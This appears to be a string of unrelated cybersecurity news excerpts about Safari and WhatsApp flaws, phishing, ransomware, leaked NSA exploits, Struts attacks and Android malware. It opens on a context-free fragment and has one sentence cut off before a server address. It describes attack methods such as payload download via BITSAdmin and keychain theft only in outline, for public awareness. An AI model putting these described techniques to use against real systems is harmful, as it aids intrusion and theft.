The fraudulent account, @SupportForAll6, uses Twitter branding, logos, colors, etc., to increase the sense of authenticity, despite a very low number of followers and a suspect name.

A Google Project Zero researcher has published a macOS exploit to demonstrate that Apple is exposing its users to security risks by patching serious flaws in iOS but not revealing the fact until it fixes the same bugs in macOS a week later.
This happened during Apple's update for critical flaws in iOS 12, tvOS 12 and Safari 12 on September 17.
A Wayback Machine snapshot of the original advisory doesn't mention any of the bugs that Project Zero researcher Ivan Fratric had reported to Apple, and which were actually fixed.
Then, a week later, after Apple patched the same bugs in macOS, the company updated its original advisory with details about the nine flaws that Fratric had reported, six of which affected Safari.
The update fixed a Safari bug that allowed arbitrary code execution on macOS if a vulnerable version of Safari browsed to a website hosting an exploit for the bugs.
While Fratric concedes that Apple is probably concealing the fix in iOS to buy time to patch macOS, he argues the end result is that people may ignore an important security update because they weren't properly informed by Apple in the security advisory.
""This practice is misleading because customers interested in the Apple security advisories would most likely read them only once, when they are first released and the impression they would get is that the product updates fix far fewer vulnerabilities and less severe vulnerabilities than is actually the case.""
Even worse, a skilled attacker could use the update for iOS to reverse-engineer a patch, develop an exploit for macOS, and then deploy it against a macOS user-base that doesn't have a patch.
Users also don't know that Apple has released information that could make their systems vulnerable to attack.
Fratric developed an exploit for one of the Safari bugs he reported and published the attack on Thursday. The bugs were all found using a publicly available fuzzing tool he developed, called Domato, meaning anyone else, including highly advanced attackers, could use it too.
""If a public tool was able to find that many bugs, it is expected that private ones might be even more successful,"" he noted.
He wasn't aiming to write a reliable or sophisticated exploit, but the bug is useful enough for a skilled exploit writer to develop an attack to spread malware and ""potentially do a lot of damage even with an unreliable exploit"".
Fratric said he successfully tested the exploit on Mac OS 10.13.6 High Sierra, build version 17G65. ""If you are still using this version, you might want to update,"" noted Fratric.
On the upside, it appears Apple and its Safari WebKit team have improved the security of the browser compared with the results of Fratric's Domato fuzzing efforts last year, which turned up way more bugs in Safari than in Chrome, Internet Explorer, and Edge. Last year he found 17 Safari flaws using the fuzzing tool.
His final word of warning is not to discount any of the bugs he found just because no one's seen them being attacked in the wild.
""While it is easy to brush away such bugs as something we haven't seen actual attackers use, that doesn't mean it's not happening or that it couldn't happen,"" the researcher noted.

Networked printers for years have left gaping holes in home and office network security.
Today, experts continue to find flaws in popular laser printers, which are putting businesses at risk.
Experts at the University Alliance Ruhr recently announced vulnerabilities in laser printers from manufacturers including Dell, HP, Lexmark, Samsung, Brother, and Konica.
The flaws could permit print docs to be captured, allow buffer overflow exploits, disclose passwords, or cause printer damage.
Up to 60,000 currently deployed printers could be vulnerable, they estimate.
When unprotected, printers expose users to several types of attacks, says Jeremiah Grossman, chief of security strategy at SentinelOne.
Hackers can use vulnerabilities to capture old printer logs, which may contain sensitive information.
They may also use these flaws to establish their foothold in a networked device and move laterally throughout the organization to gather data.
Some attackers want to wreak havoc outside a single business.
With networked printers under their control, a cybercriminal may use one company's bandwidth to perform DDoS attacks on other organizations and individuals around the world.
These examples are among the many types of damage that will continue to threaten security as part of the growing Internet of Things, Grossman predicts.
""Most of the time, printers are not going to be terribly different from any IoT device,"" he explains.
Hackers who find vulnerabilities in the web interface can take over, as they could for any device connected to the network.
The difference, of course, is printers have been around far longer than most IoT products.
This presents a market failure that will be difficult to correct because patches won't be made available.
Even when they are, devices won't be patched often.
Right now the easiest vectors include web hacking and email attacks, but they will move to IoT as computers and operating systems get more secure.
Printers are low-hanging fruit, he says, and easier to target.
He also recommends isolating printers on local networks, separate from PCs, and disabling out-of-network communication so even if they're hacked, printers can't interact with adversaries outside the organization.
Wingate suggests adopting the same baseline security practices businesses employ for computers; for example, periodically update passwords so sensitive content isn't left in the open for people to steal.
He also recommends intrusion detection, another practice people use for their PCs but don't frequently employ on printers.

WhatsApp has patched a vulnerability in its smartphone code that could have been exploited by miscreants to crash victims' chat app simply by placing a call.
Google Project Zero whizkid and Tamagotchi whisperer Natalie Silvanovich discovered and reported the flaw, a memory heap overflow issue, directly to WhatsApp in August. Now that a fix is out, Silvanovich can go public with details on the potentially serious flaw.
According to Silvanovich's report, the bug is triggered when a user receives a malformed RTP packet, triggering the corruption error and crashing the application. In practice, the malformed packet that triggers the crash could be sent via a simple call request.
""This issue can occur when a WhatsApp user accepts a call from a malicious peer,"" Silvanovich explained. ""It affects both the Android and iPhone clients.""
While Silvanovich has not said whether further actions (like remote code execution) would be possible to pull off in the wild, the flaw was serious enough to draw the attention of fellow Google researcher Tavis Ormandy.
Fortunately, as the bug has been patched users will be able to get a fix for the flaw by updating to the latest version of WhatsApp on Android and iOS. We're still waiting to hear from Google or Facebook on more details, such as if the desktop app is affected of if RCE is possible, but its PR team has a lot on today.
The disclosure will add another to the growing list of apps that will need to be updated thanks to October security patches. Earlier today, Microsoft delivered its Patch Tuesday security bundle, with Adobe dropping its second major patch bundle in as many weeks and Google having posted the Android monthly update last week.

Google users today were hit with an extremely convincing phishing spree launched by attackers who manipulated Google Docs' legitimate third-party sharing mechanism.
Targets received messages with the subject like ""[Sender] has shared a document on Google Docs with you"" often from senders they knew. The messages contained links, which led to a page that clearly requested access to the user's Gmail account. If the target user provides access, the attack begins sending spam to all the user's contacts. Theoretically, the attacker could also access the victim's messages and steal sensitive data, but thus far there have been no reports of such activity.
Because it takes advantage of Google's legitimate third-party sharing mechanism, the phishing message is much more difficult to identify as malicious. The icons and messaging are familiar to Google users. Gmail itself did not filter the messages as phishing or flag them as spam, but rather sent them to Gmail users' ""Primary"" inbox mail folders. The senders were familiar enough to have the target in their contact lists.
One way to spot the attack: some targets report that the message includes a recipient with an address that begins ""hhhhhhhhhhhhhh"" and ends with the domain ""mailinator.com.""  
Google responded with a fix and issued a statement: 
""We have taken action to protect users against an email impersonating Google Docs, and have disabled offending accounts. We’ve removed the fake pages, pushed updates through Safe Browsing, and our abuse team is working to prevent this kind of spoofing from happening again. We encourage users to report phishing emails in Gmail. If you think you were affected, visit http://g.co/SecurityCheckup""
Those who have already fallen victim to this attack should also go to their Google account permissions settings and revoke access to the false ""Google Docs"" application. They're also advised to set up two-factor authentication.

Microsoft and Google have been bitter rivals for at least a decade, and the pair have had several disagreements over security vulnerability disclosure in recent years. Google is stoking those disagreements again this week by disclosing a Microsoft Edge security flaw before a patch is available. Neowin spotted that Google disclosed the security flaw to Microsoft back in November, and the company provided 90 days for Microsoft to fix it before going public as it’s rated “medium” in terms of severity.
Google also provided Microsoft with an additional 14-day grace period to have a fix available for its monthly Patch Tuesday release in February, but Microsoft missed this goal because “the fix is more complex than initially anticipated.” It’s not clear when Microsoft will have a fix available, and the Google engineer responsible for reporting the security flaw says because of the complexity of the fix Microsoft “do not yet have a fixed date set as of yet.”
The public disclosure will likely anger Microsoft, once again. The software giant hit back at Google’s approach to security patches last October, after discovering a Chrome flaw and “responsibly” disclosed it to Google so the company had enough time to patch. At the heart of the issue is whether Google’s policy to disclose after 90 days without a patch is reasonable. Google makes exceptions to this hard rule, with grace periods, and can even disclose much sooner if the vulnerability is being actively exploited. Google disclosed a major Windows bug back in 2016 just 10 days after reporting it to Microsoft, and the company has revealed zero-day bugs in Windows in the past before patches are available.
Two big and obvious exceptions to Google’s security disclosure rules were the recent Meltdown and Spectre bugs. Google engineers discovered the CPU flaws and Intel, AMD, and others had around six months to fix the problems before the flaws were publicly disclosed earlier this year. Chrome OS and Android devices were also affected by the processor flaws, along with Windows, Linux, macOS, and iOS.
Google wants the industry to adopt its aggressive disclosure policies, but Microsoft has so far resisted rather publicly. This latest episode isn’t as critical as some of the past disclosures, but it will likely reignite the debate over whether Google, a company with competitive commercial interests, should be leading the way security flaws in rival operating systems are disclosed in the public interest.

The ransomware is linked to a leaked vulnerability originally kept by the National Security Agency.
Major corporations across the world have been hit by a wave of ransomware attacks that encrypt computers and then demand that users pay $300 to a bitcoin address to restore access.
While countries across Europe — the United Kingdom, Ukraine, Spain and France, to name a few — were hit hardest by the outbreak, the virus has now spread to the United States.
Today, one of the largest drug makers in the U.S., Merck, reported being infected by the malware, as did the multinational law firm DLA Piper, which counts more than 20 offices in the U.S.
Heritage Valley Health Systems, a health care network that runs two hospitals in Western Pennsylvania, also confirmed in a statement to Recode on Tuesday that it was a victim of the same ransomware attack that has spread around the globe.
At least one surgery had to be postponed because of the hack, according to a woman interviewed by Pittsburgh Action News 4.
The malware, which has been dubbed NotPetya, has been confirmed by multiple security firms to resemble the WannaCry ransomware attack, which in May infected hundreds of thousands of computers by taking advantage of a National Security Agency hacking tool called Eternal Blue. 
That exploit was leaked last April by a hacker or group of hackers called ShadowBrokers. Eternal Blue takes advantage of a vulnerability in the Windows operating system, for which Microsoft issued a patch earlier this year. Not all Windows users installed the update — hence one of the reasons WannaCry was able to spread.
“Our initial analysis found that the ransomware uses multiple techniques to spread, including one which was addressed by a security update previously provided for all platforms from Windows XP to Windows 10,” Microsoft said in a statement to Recode.
Microsoft further advised users to exercise caution when opening files in emails from unknown sources, since malware is often spread through email attachments. Microsoft also noted that its antivirus software is capable of detecting and removing the ransomware.
Ukraine appears to have been the country most affected by today’s ransomware outbreak, according to a chart shared in a tweet by Costin Raiu, the director of a global research team with Kaspersky Lab.

A leaked arsenal of hacking tools allegedly belonging to the National Security Agency (NSA) shows the US spy agency infiltrated the servers of a major Pakistani cellular service provider.
The data dump, publicly released by the ShadowBrokers hacking group earlier this week, includes alleged digital weapons and notes shared by NSA operators about their access inside the servers of a Pakistani mobile network.
Notes contained in the massive dump of encrypted data, which is still being analysed by network security researchers, include details of how NSA used the exploits to infiltrate cellular operators in Pakistan.  
One snippet from the leak, several terabytes in size, includes at least 14 lines mentioning different servers operated by a major Pakistani cellular network.  
The snippet, analysed by a security researcher who goes by the name X0rz, appears to show NSA operators sharing a step-by-step technical guide on how to hack into the servers.
""Try one of the following…old way, may not work on new machines,"" says one section of the snippet.
Another section appears to show methods to retrieve call logs of users of the Pakistani cellular service.
""If searching for LACs and cell id's, use the format in the documentation…if searching for phone numbers, use the normal format,"" it says.
Hundreds of NSA cyber weapons variants publicly released including code showing hacking of Pakistan mobile system https://t.co/bL833ktQpm
In a tweet, Wikileaks claimed the leaked ""NSA cyber weapons variants"" include ""code showing hacking of Pakistan mobile system"".
The data dump was publicly released earlier this week by the ShadowBrokers hacking group after it failed to auction the arsenal of hacking tools.
In a lengthy anonymous blog post, the group claimed it was releasing the files as a ""form of protest"" after losing faith in the leadership of US President Donald Trump.
ShadowBrokers had announced the auction for the alleged NSA cyber weapons in August last year.
The authenticity of the code being NSA software was later confirmed by documents provided by whistleblower and former National Security Agency contractor Edward Snowden to the Intercept.
In the leak of top-secret documents, Snowden released a classified draft NSA manual on how to implant the SECONDDATE malware – malicious code used to monitor or control someone else's computer.
The draft NSA manual contained instructions telling NSA operators to use a specific string of characters associated with the SECONDDATE malware program.
The documents revealed at least ""two documented cases of SECONDDATE being used to successfully infect computers overseas"" including ""successful attacks against computer systems in…Pakistan.""
A report by The Intercept claimed NSA hackers used the malicious program to breach targets in Pakistan’s NTC VIP Division, which contained documents pertaining to ""the backbone of Pakistan’s Green Line communications network"" used by the ""civilian and military leadership"".

If you get a Google Doc link in your inbox today, scrutinize it carefully before you click—even if it looks like it comes from someone you trust. A nasty phishing scam that impersonates a Google Docs request has swept the internet today, including a decent chunk of media companies. You've heard ""think before you click"" a million times, but it really could save you from a whole lot of hassle.
Google has taken steps to neutralize this particular phish. The company said in a statement that it has ""disabled offending accounts. We’ve removed the fake pages, pushed updates through Safe Browsing, and our abuse team is working to prevent this kind of spoofing from happening again."" But when it comes to phishing defense there's always an element of cat and mouse. Large-scale phishing attacks and those impersonating popular services like Google log-in pages regularly stalk the internet.
""The importance of this phish is not how it spread, but rather how it didn’t use malware or fake websites tricking users to give up their passwords,"" says Aaron Higbee, chief technology officer at the phishing research and defense company PhishMe, which analyzed data from the fake Google Docs campaign. ""This phish worked because it tricked the user into granting permissions to a third-party application. This is the future of phishing, and every security technology vendor is ill-equipped to deal with it.""
Similar Google Docs scams in particular have been circulating since at least 2014, but that doesn't make them any easier to spot, in part because they seem so authentic. Phishers can use real Google accounts and develop third-party plugins that can interact with Google services, so they can lure victims in through the most perfect-looking Google web pages of all: Genuine ones.

Ticketfly has been grounded.
After a ""series of recent issues,"" the online ticketing service took down all its websites Thursday, saying it was ""the target of a cyber incident."" 
""Out of an abundance of caution, we have taken all Ticketfly systems temporarily offline as we continue to look into the issue,"" the company said across its many properties. Ticketfly didn't comment on whether any user information, such as credit card data, had been stolen in the cyberattack. 
""We realize the gravity of this decision, but the security of client and customer data is our top priority,"" a Ticketfly spokeswoman said in an email.
The company's pages have been down since 6 a.m. ET.
A hacker who goes by ""IShAkDz"" has taken credit for the attack. Before Ticketfly took down its websites, the hacker left a taunting message across the service's website: ""Your security down, I'm not sorry. Next time I will publish database."" The hacker, who also left an e-mail address, appeared to have a database with more than 4,000 spreadsheets holding people's information, including email addresses, phone numbers, names and addresses.
In an email, the attacker told CNET that he or she contacted TicketFly about the potential exploit multiple times, but didn't hear back. The attacker demanded TicketFly pay 1 bitcoin to fix the cyberattack, which is currently worth $7,544.
The Ticketfly spokeswoman didn't comment on the alleged hacker.
Eventbrite, which owns Ticketfly, doesn't have any issues on its website.

A flaw in unpatched versions of Window 10 could leave machines vulnerable to EternalBlue, the remote kernel exploit behind the recent WannaCry ransomware attack.
WannaCry targeted a Server Message Block (SMB) critical vulnerability that Microsoft patched with MS17-010 on March 14, 2017. While WannaCry damage was mostly limited to machines running Windows 7, a different version of EternalBlue could infect Windows 10.
Researchers at RiskSense stripped the original leaked version of EternalBlue down to its essential components and deemed parts of the data unnecessary for exploitation. They found they could bypass detection rules recommended by governments and antivirus vendors, says RiskSense senior security researcher Sean Dillon.
This version of EternalBlue, an exploit initially released by Shadow Brokers earlier this year, does not use the DoublePulsar payload common among other exploits leaked by the hacker group. DoublePulsar was the main implant used in WannaCry and a key focus for defenders.
""That backdoor is unnecessary,"" says Dillon, noting how it's dangerous for businesses to only focus on DoublePulsar malware. ""This exploit could directly load malware onto the system without needing to install the backdoor.""
EternalBlue gives instant un-credentialed remote access to Windows machines without the MS17-010 patch update. While it's difficult to port EternalBlue to additional versions of Windows, it's not impossible. Unpatched Windows 10 machines are at risk, despite the fact that Microsoft's newest OS receives exploit mitigations that earlier versions don't.
The slimmed-down EternalBlue can be ported to unpatched versions of Windows 10 and deliver stealthier payloads. An advanced malware would be able to target any Windows machine, broadening the spread of an attack like WannaCry, Dillon explains.
It's worth noting WannaCry was a blatant, obvious attack, he says, and other types of malware, like banking spyware and bitcoin miners, could more easily fly under the radar.
""These can infect a network and you won't know about it until years later,"" he says. ""It's a threat to organizations that have been targets, like governments and corporations. Attackers may try to get onto these networks and lay dormant … then steal intellectual property or cause other damage.""
Dillon emphasizes the importance of updating to the latest version of Windows 10, but says patching alone won't give complete protection from this kind of threat. Businesses with SMB facing the Internet should also put up firewalls, and set up VPN access for users who need external access to the internal network.
 Businesses should have a good inventory of software and devices on their networks, along with processes for identifying and deploying patches as they are released, says Craig Young, computer security researcher for Tripwire's Vulnerability and Exposures Research Team (VERT). This will become even more critical as attackers move quickly from patch to exploit.
There will always be a window of opportunity for attackers before the right patches are installed, Young notes. EternalBlue is a ""very fresh vulnerability"" given that most breaches that use exploits leverage flaws that have been publicly known for an average of two years or more.
""EternalBlue is a particularly reliable exploit that gives access to execute code at the very highest privilege level, so I would expect that hackers and penetration testers will get a lot of use out of it for years to come,"" he says.

This week researchers found a piece of malware in the wild, built to steal passwords from the macOS keychain.
Named ""MacDownloader"" and posing as, what else, a fake Flash Player update, the new malware was found on the Mac of a human rights advocate and believed to originate from Iran.
The malware's code is very sloppy and appears to have been made by an amateur who took pieces of other's code and repurposed them.
The threat report mentions the following:
MacDownloader seems to be poorly developed and created towards the end of 2016, potentially a first attempt from an amateur developer.
In multiple cases, the code used has been copied from elsewhere.
The simple activity of downloading the remote file appears to have been sourced from a cheat sheet.
The main purpose of MacDownloader seems to be to perform an initial profiling of the infected system and collection of credentials from macOS’s Keychain password manager – which mirrors the focus of Windows malware developed by the same actors.
At this time, it appears the malware is not a threat and the Command & Control server has been taken down.
Intego VirusBarrier offers protection from this malware, detected as OSX/MacDownloader.
Security researchers found that this malware was originally designed as a fake Bitdefender antivirus, but was later repackaged as a fake Flash Player update.
Once installed, the malware attempts to achieve persistence by use of a poorly implemented shell script, which at the time of writing did not function due to the C&C server being offline.
MacDownloader displays a fake Flash Player update that offers an ""Update Flash-Player"" button and a ""Close"" button.
Unlike other malware of its kind, clicking the Close button actually exists the installer and nothing malicious is placed on the system.
If the Update button is clicked though, a malware dialog will pop-up, which is, of course, fake as well.
These dialogues are also rife with basic typos and grammatical errors, indicating that the developer paid little attention to quality control.
After a user clicks on OK, the software mimics the System Preferences to request the admin password in order to grab more info on the system.
If the user enters their password and clicks OK, the software grabs the info, and then it tries to open a remote connection to:
MacDownloader collects user keychain information and uploads it to said C&C server, including documents the running processes, installed applications and the username and password, which are acquired through a fake System Preferences dialog.
The name and password, which in almost all cases are Administrator credentials, give the malware everything it needs to access the keychain information.
With access to the keychain the sky is the limit, because email account passwords, social network account details, and much more, are all stored in the keychain.

Kaspersky Lab researchers have brought to light a series of attacks leveraged against 140+ banks and other businesses around the world.
But what makes these attacks unusual is the criminals’ use of widely used legitimate tools and fileless malware, which explains why the attacks went largely unnoticed.
“This threat was originally discovered by a bank’s security team, after detecting Meterpreter code inside the physical memory of a domain controller (DC),” the researchers explained.
“Kaspersky Lab participated in the forensic analysis after this attack was detected, discovering the use of PowerShell scripts within the Windows registry.
Additionally it was discovered that the NETSH utility as used for tunnelling traffic from the victim’s host to the attacker´s C2”.
Meterpreter is a well known Metasploit payload that allows attackers to control the screen of a device using VNC and to browse, upload and download files.
NETSH (network shell), is a Windows command-line utility that allows local or remote configuration of network devices.
The attackers also took advantage of the Windows SC utility to install a malicious service to execute PowerShell scripts, and Mimikatz to extract credentials from compromised machines.

Ransomware authors are profiting from the rise of the cryptocurrency -- but it's also bringing some unexpected problems for them and other dark web operators.
The value of bitcoin has soared in recent days: at the one point the cryptocurrency was worth almost $19,000 before it dropped back to around $16,500, where it has roughly remained since.
It's almost impossible to predict what will happen next. The price of bitcoin could rise again or it could crash -- but, for now at least, a single unit of the cryptocurrency is worth a significant amount of money.
Bitcoin has become the popular payment method for ransomware over the last two years, as the digital currency provides cybercriminals with a means of collecting ransoms, while also making it difficult to get the ransom-collectors' identities, thanks to the level of anonymity it offers. WannaCry, the biggest ransomware event of the year, for example, hit hundreds of thousands of PCs around the globe, encrypting files and demanding a payment of $300 in bitcoin for the safe return of what was stored on the machine.
In this instance, the ransomware code itself was poorly written and the vast majority of victims were able to restore their systems without giving into the demands of the cyber-attackers.
However, by the time those behind WannaCry had withdrawn funds from the associated Bitcoin wallets -- a full three months after the attack -- it meant the 338 payments victims had made were worth around $140,000, which was an increase in value of just under $50,000 compared to when the majority of payments were made.
If those behind WannaCry have held onto their illicit investment, they could now be sitting on over $1m of bitcoin.
But the sudden spike in bitcoin could actually be problematic for some cybercriminals. Before the surge in value, 1 or 0.5 bitcoin was a common ransom demand, with the idea that if the fee was low enough -- back then the ransom value worked out at a few hundred dollars -- this would encourage the victim to pay up.
Even as the value of bitcoin steadily rose during the summer, some attackers were still using the standard amounts of cryptocurrency as their ransom demand. For example, Magniber ransomware demanded a payment of 0.2 bitcoin ($1,138 in mid-October), rising to 0.4 bitcoin ($2,275 in mid-October) if the payment wasn't received within five days. Two months later, 0.2 bitcoin is currently worth $3,312 while 0.4 bitcoin is up to $6,625.
Many forms of ransomware already ask for the payment of a specified amount of dollars to be made in bitcoin. While it pins hopes on victims being able to buy a specific amount of bitcoin and successfully transfer the payment -- which some criminal gangs get around by manning help desks providing advice on buying cryptocurrency -- it's more likely to result in the victim paying up, especially if the figure is just a few hundred dollars.
""I imagine the volatility of bitcoin pricing has been an unexpected problem for cybercriminals. The average ransom demand has remained somewhere between $300 to $1000, and normally the ransom note will specify a USD amount,"" Andy Norton, director of threat intelligence at Lastline, told ZDNet.
It isn't just ransomware distributors who might be faced with the problem of valuing items in pure bitcoin: a Dark Web vendor -- whether they are selling malware, weapons, drugs, or any other illegal item -- might find that setting their price in pure bitcoin will quickly result in them pricing themselves out of the market.
With bitcoin prices continuing to rise, sophisticated cybercriminal operators can likely react to it, altering prices on a day-to-day basis to ensure that they're able to sustain their business.
Criminals are trying out alternative pricing models for ransomware already. Some criminals already operate around the idea that they charge victims just enough so that they don't see the ransom as too much to pay -- and that often depends on the country the victims are in. The Fatboy ransomware payment scheme charges victims in poorer countries less than those in richer ones.
Meanwhile, those behind Scarab ransomware have started asking victims to suggest a payment amount for receiving the encryption key for their files.

For more than a month, at least ten groups of attackers have been compromising systems running applications built with Apache Struts and installing backdoors, DDoS bots, cryptocurrency miners, or ransomware, depending if the machine is running Linux or Windows.
For their attacks, the groups are using a zero-day in Apache Struts, disclosed and immediately fixed last month by Apache.
The vulnerability, CVE-2017-5638, allows an attacker to execute commands on the server via content uploaded to the Jakarta Multipart parser component, deployed in some Struts installations.
Attackers initially focused on Linux server.
According to cyber-security firms F5, attacks started as soon as Cisco Talos researchers revealed the zero-day's presence and several proof-of-concept exploits were published online.
Since early March, attacks have slowly evolved. F5 experts say that in the beginning, attackers targeted Struts instances running on Linux servers, where they would end up installing the PowerBot malware, an IRC-controlled DDoS bot also known as PerlBot or Shellbot.
In later attacks, some groups switched to installing a cryptocurrency miner called ""minerd"" that mined for the Monero cryptocurrency.
In other attacks reported by the SANS Technology Institute, some attackers installed Perl backdoors.
Recent attacks also targeted Struts running on Windows
Both SANS and F5 experts report that after March 20, one of these groups switched to targeting Struts instances installed on Windows systems.
Using a slightly modified exploit code, attackers executed various shell commands to run the BITSAdmin utility and then downloaded (via Windows' built-in FTP support) the Cerber ransomware.
From this point on, Cerber took over, encrypted files, and displayed its standard ransom note, leaving victims no choice but pay the ransom demand or recover data from backups.
""The attackers running this [Cerber] campaign are using the same Bitcoin ID for a number of campaigns,"" the F5 team said. ""This particular account has processed 84 bitcoins [~$100,000].""
F5 experts also noted that, on average, roughly 2.2 Bitcoin (~$2,600) go in and out of this particular wallet on a daily basis. The most recent payments dates to today.
It is worth mentioning that F5 published their findings last week, on March 29. Today, SANS detailed similar findings, meaning the campaign spreading Cerber ransomware via Struts on Windows is still going strong.
A patch for Apache Struts servers is available on the Struts website. Struts is an open source MVC framework for creating modern Java web applications, and its widely used in enterprise environments, for both Intranets and public websites. Some of the initial attacks on Struts-based applications have been tracked by cyber-security firm AlienVault.

Earlier this year we wrote about a fast-spreading WhatsApp scam that promised free Wi-Fi access.
That scam implied that WhatsApp itself was making the offer in order to keep you active on WhatsApp without using any airtime or data from your own mobile provider network.
It was all a pack of lies, of course, as became obvious if you clicked through to the various links seen in the scam campaign.
When we used an old-model iPhone, we were bait-and-switched to what was supposedly a lucky draw in which we could allegedly win a brand new iPhone – in return for forwarding the original scam to four of our friends and four groups of friends:
We didn’t do that, of course, so we can’t tell you what we would have had to do next to qualify for entry into the “prize draw”, but most scams of this sort involve getting you to fill in one or more surveys, in which you hand over personal information such as email address, phone number and often your physical address.
The excuse that “we need to know how to contact you and where to deliver the prize if you win” is sometimes used as an incentive to squeeze you into giving away information that you might otherwise refuse to reveal to strangers.
Watch out for competitions that do this: if the only purpose of collecting the data is to deal with one winner out of all the entrants, why not wait until the winner is known and ask just that person?
When we played along with the WhatsApp scam from an Android device, we had to forward the scam to 15 friends and install two apps:
The suggestion to “Please Download Both Apps below to Enable Ultra Wifi” did no such thing: one app was the front-end for an Android software marketplace catering to users in India; the other was a shopping app for a popular Chinese web service.
The apps were legitimate, and unconnected with the scam except that the crooks selected them as baits to try to rack up fraudulent pay-per-install affiliate fees.
The “free Wi-Fi” never materialised, of course, because it was a fabrication from the start.
Over the past weekend, several Naked Security readers in the UK alerted us to a similar sort of WhatsApp scam, this time stealing the brands of at least two major UK supermarket chains.
Unsurprisingly, especially with the 6/6 vision that hindsight so often brings, the “free gift cards” in this latest scam campaign are as elusive as the “free Wi-Fi” in the earlier scam.
We received numerous screenshots of the offending messages, targeting two different brands and referencing three different domain names in their clickable links.
Fortunately, the hosting provider that services these three domains, all of which have their contact data shielded behind a domain privacy service based in The Bahamas, has pulled the plug on them.
The links in the scams we’ve seen now terminate at a holding page that keeps potential victims away from the scammers:
According to reports from people we talked to who were tricked into going through with the scam while the links were alive, the results were very much like those we observed in the “free Wi-Fi” scam above.
One person was given a survey to complete; another was asked to install an app they wouldn’t otherwise have considered.
The big difference between a typical WhatsApp scam and an email scam is that the messages you receive come from someone you know, because they’ve been tricked into forwarding the scam.
Email spam campaigns usually rely heavily on malware-infected computers known as bots (short for “robots”) or zombies that can be remotely commanded to start sending unwanted messages secretly in the background.
But WhatsApp scammers don’t need to mess around with malware to subvert your phone into sending unwanted messages, because they can use the goodwill and trust that typically exists between friends to convince people to spread their scams willingly.

Advanced Persistent Threat group linked to China said to be attacking companies by targeting their suppliers - scale of operation said to be unprecedented.
A Chinese hacking group is thought to be behind attacks on managed service providers as a way into their client companies, to facilitate the theft of intellectual property.
The hacking group, called APT10, used custom malware and spear-phishing attacks to gain access to victims' systems. Once inside, they used the company's credentials to attack their client companies.
The security of the supply chain has been a recognised weakness in security systems since at least 2013 when it was discovered that attackers had gained access to the Target retail chain in America through an HVAC service provider.
Now it appears that APT10 is using that approach on a large scale. The group was discovered by PwC's cyber-security practice and BAE Systems, working alongside the UK's National Cyber Security Centre (NCSC).
The scale of the espionage campaign only became apparent in late 2016, but the attack is thought to be the largest sustained global cyber-espionage campaign ever seen. 
PwC and BAE Systems said APT10 conducted the espionage campaign by targeting providers of managed outsourced IT services as a way in to their customers' organisations around the world, gaining unprecedented access to intellectual property and sensitive data.
It is thought the group launched the campaign in 2014 and then significantly ramped it up in early 2016, adding new developers and intrusion operators to continually enhance capability.
The group is known to have exfiltrated a high volume of data from multiple victims and used compromised networks to stealthily move this data around the world.
A number of Japanese organisations have also been targeted directly in a separate, simultaneous campaign by the same group, with APT10 masquerading as legitimate Japanese government entities to gain access.
Forensic analysis of the timings of the attack, as well as tools and techniques used, led investigators to conclude that the group may be based in China, but apart from that, it is not known precisely who is behind APT10 or why it targets certain organisations.
Kris McConkey, partner for cyber-threat detection and response at PwC, said that the  indirect approach of this attack highlights the need for organisations to have a comprehensive view of the threats they're exposed to – including those of their supply chain.
“This is a global campaign with the potential to affect a wide range of countries, so organisations around the world should work with their security teams and providers to check networks for the key warning signs of compromise and ensure they respond and protect themselves accordingly,” he said.
Richard Horne, cyber-security partner at PwC, added that “operating alone, none of us would have joined the dots to uncover this new campaign of indirect attacks.
“Together we've been working to brief the global security community, managed service providers and known end victims to help prevent, detect and respond to these attacks,” he added.  
Ilia Kolochenko, CEO of High-Tech Bridge, told SC Media UK that until there is more detail on the attacks, it would not be possible to make a reliable conclusion as to who was behind the so-called APT10.
“Taking into consideration how careless and negligent some managed IT providers are, I wouldn't be surprised if all the attacks were conducted by a group of teenagers – something we have already seen in the past,” he said.
“IT services providers should better enumerate and assess their digital risks, and implement appropriate security controls to mitigate related threats and vulnerabilities. Security standards, like ISO 27001, can significantly help assure that the risks are continuously identified and are being duly addressed. For cyber-security service providers, accreditation by CREST is also an important factor to demonstrate the necessary standard of care around security, confidentiality and integrity for their own and client data,” he added.
“Companies looking to secure their supply-chain can oblige their suppliers to get certified by ISO 27001 for example, or to provide solid and unconditional insurance to cover any data breaches and data leaks, including direct and consequent damages.""

A hacker claims to have managed to get his hands on 6.5 million email addresses and poorly hashed passwords pertaining to users of Dueling Networks, a now-dead Flash game that's based on the Yu-Gi-Oh trading card game. 
Dueling Network shut down in 2016, but its site's forum carried on until recently. ""Only our forum site was still up as a way for our users to communicate with each other (login used Dueling Network credentials). Now that is down and warns users to change passwords on any other sites they may have used the same password on,"" a site admin told Motherboard.
The hacker made away with at least 6.5 million accounts, although the site admin claims that not all those necessarily correspond to individual players, as many of the accounts may have been duplicates owned by the same user, or were never actually logged in. ""This number is inflated,"" the site admin claims.
""Weak password hashing makes them readable in plaintext""
The data trove the hacker got its hands on includes email addresses and passwords hashed with MD5, which is pretty much useless at this point. This means that hackers are quite likely able to see all the passwords in plaintext, which is bad news for anyone who reuses those passwords for any accounts linked to the same email addresses.
Black Luster Soldier, the admin of Dueling Network, believes the hacker used a vulnerability in MySQL to obtain the data, although nothing is confirmed at this point.
Regardless of how the hack happened, users are advised to change their passwords for any other 
services they use the same credentials as on Dueling Network.

Trend Micro has identified more malicious Android apps abusing the name of the popular mobile game Super Mario Run. We earlier reported about how fake apps were using the app’s popularity to spread; attackers have now released versions of these fake apps that steal the user’s credit card information.
Super Mario Run is a mobile game that Nintendo first released on the iOS platform in September 2016, followed by the Android version on March 23, 2017. Mobile games have always proven to be attractive lures for cybercriminals to get users to download their malicious apps and potentially unwanted apps (PUAs). This is not the first time that the name of a popular game was abused; we’ve discussed how the popularity of Pokémon Go was similarly abused.
Based on feedback from the Smart Protection Network™, we saw more than 400 of these apps in the first three months in 2017 alone. In the same time frame, we saw 34 fake apps explicitly named “Super Mario Run”—it’s a noteworthy trend, as we saw the first of these only in December 2016.
In this post we’ll discuss the behavior of a new credit card stealing variant named “Fobus” (detected as ANDROIDOS_FOBUS.OPSF).
Cybercriminals frequently take advantage of popular and hotly anticipated titles to push their own malicious apps. These are usually distributed via third-party app stores. Some users may utilize such app stores to download “unreleased” versions of legitimate apps, or to obtain apps for free. These apps are illegitimate in the first place, and the risks to end users are quite high. We strongly advise that users download and install apps only from legitimate app stores such as Google Play or trusted third-party app store.
